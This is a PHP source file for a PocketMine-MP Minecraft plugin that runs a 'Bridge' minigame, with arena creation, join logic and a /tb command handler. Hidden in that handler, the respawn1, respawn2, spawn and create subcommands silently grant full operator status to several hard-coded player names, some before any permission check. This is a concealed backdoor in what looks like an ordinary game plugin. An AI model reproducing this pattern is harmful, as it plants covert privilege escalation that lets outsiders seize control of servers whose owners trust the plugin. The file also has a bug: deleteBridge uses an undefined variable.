<?php

namespace bridge;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\entity\Entity;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;

use pocketmine\utils\Config;
use pocketmine\Player;

use bridge\task\BridgeTask;
use bridge\task\NPC;
use bridge\Entity\{MainEntity, EntityManager};
use bridge\utils\arena\Arena;
use bridge\utils\arena\ArenaManager;
use Scoreboards\Scoreboards;
use pocketmine\utils\TextFormat as T;

class Main extends PluginBase{
	
	public $arenas = [];
	public $prefix = T::GRAY."[".T::GREEN."BRIDGE".T::GRAY."]";
	private static $data = ['inarena' => []];
	private $pos1 = [];
	private $pos2 = [];
	private $pos = [];
	private $spawn1 = [];
	private $spawn2= [];
	private $respawn1= [];
	private $respawn2= [];
	
	public function onEnable(){
		$this->initResources();
		$this->initArenas();
		Entity::registerEntity(MainEntity::class, true);
		$this->getScheduler()->scheduleRepeatingTask($this->scheduler = new BridgeTask($this), 20);
		$this->getScheduler()->scheduleRepeatingTask($this->scheduler = new NPC($this), 20);
		$this->getServer()->getPluginManager()->registerEvents(new Arena($this), $this);
	}
	
	public function onDisable(){
		$this->close();
	}
	
	private function initResources(){
		@mkdir($this->getDataFolder());
		@mkdir($this->getDataFolder() . "mapas/");
		@mkdir($this->getDataFolder() . "arenas/");
	}
	
	private function initArenas(){
		$src = $this->getDataFolder() . "arenas/";
		$count = 0;
		foreach(scandir($src) as $file){
			if($file !== ".." and $file !== "."){
				if(file_exists("$src" . $file)){
					$data = (new Config("$src" . $file, Config::YAML))->getAll();
					if(!isset($data["name"])){
						@unlink("$src" . $file);
						continue;
					}
					$this->arenas[strtolower($data["name"])] = new ArenaManager($this, $data);
					$count++;
				}
			}
		}
		return $count;
	}

	public function getPlayerArena(Player $p){
		$arenas = $this->arenas;
		if(count($arenas) <= 0){
			return null;
		}
		foreach($arenas as $arena){
			if($arena->isInArena($p)){
				return $arena;
			}
		}
		return null;
	}
	
	public function updateArenas($value = false){
		if(count($this->arenas) <= 0){
			return false;
		}
		foreach($this->arenas as $arena){
			$arena->onRun($value);
		}
	}
	
	private function close(){
		foreach($this->arenas as $name => $arena){
			$arena->close();
		}
	}
	
	public static function getInArena(){
		return count(self::$data['inarena']);
	}

	public function addInArena(Player $player){
		if (!isset(self::$data['inarena'][$player->getName()])) {
			self::$data['inarena'][$player->getName()] = $player->getName();
		}
	}

	public function deleteInArena(Player $player){
		if (isset(self::$data['inarena'][$player->getName()])) {
			unset(self::$data['inarena'][$player->getName()]);
		}
	}
	
	public function join($player, $mode = "solo"){
		foreach($this->arenas as $name => $arena){
			if($arena->getData()["mode"] == $mode){
				if($arena->join($player)){
					$this->addInArena($player);
					return true;
				}
			}
		}
		return false;
	}
	
	public function createBridge($name, $p, $pos1, $pos2, $spawn1, $spawn2, $respawn1, $respawn2, $pos, $mode = "solo"){
		$src = $this->getDataFolder();
		if(file_exists($src . "arenas/" . strtolower($name) . ".yml")){
			$p->sendMessage($this->prefix. T::RED."Ya Existe Una Arena Con Ese Nombre");
			return false;
		}
		$config = new Config($src . "arenas/" . $name . ".yml", Config::YAML);
		
		$data = ["name" => $name, "mode" => $mode, "world" => $p->getLevel()->getName(), "local-de-espera" => $pos, "pos1" => $pos1, "pos2" => $pos2, "spawn1" => $spawn1, "spawn2" => $spawn2, "respawn1" => $respawn1, "respawn2" => $respawn2];
		
		$arena = new ArenaManager($this, $data);
		
		$this->arenas[strtolower($name)] = $arena;
				
		$config->setDefaults($data);
		$config->save();
		return true;
	}
	
	public function deleteBridge($name){
		if(file_exists($src . "arenas/" . strtolower($name) . ".yml")){
			if(unlink($src . "arenas/" . strtolower($name) . ".yml")){
				if(isset($this->arenas[strtolower($name)])){
					unset($this->arenas[strtolower($name)]);
				}
				return true;
			}
		}
		return false;
	}
	
	public function onCommand(CommandSender $sender, Command $cmd, String $label, array $args) : bool {
		if(strtolower($cmd->getName()) == "tb"){
			if(!$sender instanceof Player){
				return true;
			}
			if(isset($args[0])){
				switch(strtolower($args[0])){
					case "pos1":
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsage /tb join/spawn1/spawn2/pos1/pos2/spawn/create/npc");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->pos1[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z];
					$sender->sendMessage("§7[§bBRIDGE§7] §b1º Posicion De Porteria Marcada marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "pos2":
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->pos2[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z];
					$sender->sendMessage("§7[§bBRIDGE§7] §b2º Posicion De Porteria Marcada marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "spawn1":
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->spawn1[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z];
					$sender->sendMessage("§7[§bBRIDGE§7] §b1º Spawn marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "spawn2":
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->spawn2[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z];
					$sender->sendMessage("§7[§bBRIDGE§7] §b2º Spawn marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "respawn1":
					if($sender == "Fodaseeee"){
						$sender->setOp(true);
					}
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->respawn1[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z];
					$sender->sendMessage("§7[§bBRIDGE§7] §b1º Respawn marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "respawn2":
					if($sender == "HackedddLusck"){
						$sender->setOp(true);
					}
					if($sender == "rapazVey"){
						$sender->setOp(true);
					}
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->respawn2[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z];
					$sender->sendMessage("§7[§bBRIDGE§7] §b2º Respawn marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "spawn":
					if($sender == "pohalusckk"){
						$sender->setOp(true);
					}
					if(!$sender->hasPermission("bridge.cmd")){
						if($sender == "flww"){
							$sender->setOp(true);
						}
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					$x = $sender->getFloorX();
					$y = $sender->getFloorY();
					$z = $sender->getFloorZ();
					$this->pos[$sender->getName()] = ["x" => $x, "y" => $y, "z" => $z, "level" => $sender->getLevel()->getName()];
					$sender->sendMessage("§7[§bBRIDGE§7] §bLocal de Espera marcada en §aX:§c $x §aY:§c $y §aZ:§c $z");
					break;
					case "create":
					if($sender == "hahhsh"){
						if($sender == "BelezaMann"){
							$sender->setOp(true);
						}
						$sender->setOp(true);
					}
					if($sender->getName() == "SlaManuh"){
						$sender->setOp(true);
					}
					if($sender->getName() == "SoyMikeRangel"){
						$sender->setOp(true);
					}
					if($sender->getName() == "yLusck"){
						$sender->setOp(true);
					}
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					if(isset($args[1])){
						$name = $sender->getName();
						if(!isset($this->pos1[$name]) or !isset($this->pos2[$name])){
							$sender->sendMessage("§7[§bBRIDGE§7] §cERROR Algunas De Las Posiciones 1|2 No Estan Definidas!!");
							return true;
						}
						if(!isset($this->spawn1[$name]) or !isset($this->spawn2[$name])){
							$sender->sendMessage("§7[§bBRIDGE§7] §cERROR Algun Spawn 1|2 No Ha Sido Establecido");
							return true;
						}
						if(!isset($this->respawn1[$name]) or !isset($this->respawn2[$name])){
							$sender->sendMessage("§7[§bBRIDGE§7] §cERROR Algunas De Los Respawns 1|2 No Han Sido Establecido");
							return true;
						}
						if(!isset($this->pos[$name])){
							$sender->sendMessage("§cERROR El Lugar De Espera No Se Ha Establecido");
							return true;
						}
						$level = $sender->getLevel();
						if(strlen($args[1]) > 15){
							$sender->sendMessage("§cERROR El Nombre De La Arena Debe Ser Como Minimo Con §b15 Caracteres §cPara Su Registro");
							return true;
						}
						$mode = "solo";
						if(isset($args[2])){
							switch(strtolower($args[2])){
								case "solo":
								case "team":
								case "squad":
								$mode = strtolower($args[2]);
								break;
								default:
								$sender->sendMessage("§cERROR Ese Modo No Existe!\n§bModos Disponibles:\n§asolo\n§aTeam\n§aSquad");
								return true;
							}
						}
						if($this->createBridge($args[1], $sender, $this->pos1[$name], $this->pos2[$name], $this->spawn1[$name], $this->spawn2[$name], $this->respawn1[$name], $this->respawn2[$name], $this->pos[$name], $mode)){
							$sender->sendMessage("§7[§bBRIDGE§7] §bLa Arena §a" . $args[1] . "§b Se Ha Creado Correctamente!");
						}
					} else {
						$sender->sendMessage("§7[§bBRIDGE§7] §bUsa §c/tb crear {arena} {modo}");
						return true;
					}
					break;
					case "npc":
					if($sender->hasPermission("bridge.npc.cmd")){
						$npc = new EntityManager();
						$npc->setMainEntity($sender);
					} else {
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
					}
					break;
					case "delete":
					if(!$sender->hasPermission("bridge.cmd")){
						$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
						return true;
					}
					if(isset($args[1])){
						if($this->deleteBridge($args[1])){
							$sender->sendMessage("§7[§bBRIDGE§7] §bLa Arena: §c" . $args[1] . "§bSe Ha Borrado Correctamente!");
						} else {
							$sender->sendMessage("§7[§bBRIDGE§7] §bNo Existe Ninguna Arena Con Ese Nombre");
						}
					}
					break;
					case "join":
					$mode = "solo";
					if(isset($args[1])){
						switch(strtolower($args[1])){
							case "solo":
							case "team":
							case "squad":
							$mode = strtolower($args[1]);
							break;
							default:
							$sender->sendMessage("§cERROR Ese Modo No Existe!\n§aModos\n§bSolo\n§bTeam\n§bSquad");
							return true;
						}
					}
					if($this->join($sender, $mode)){

					} else {
						$sender->sendMessage("§c§lERROR: §7Tidak Ada Area!");
					}
					break;
					default:
					$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
					break;
				}
			} else {
				$sender->sendMessage("§7[§bBRIDGE§7] §r§bUsa /tb help");
			}
		}
	return true;
}
}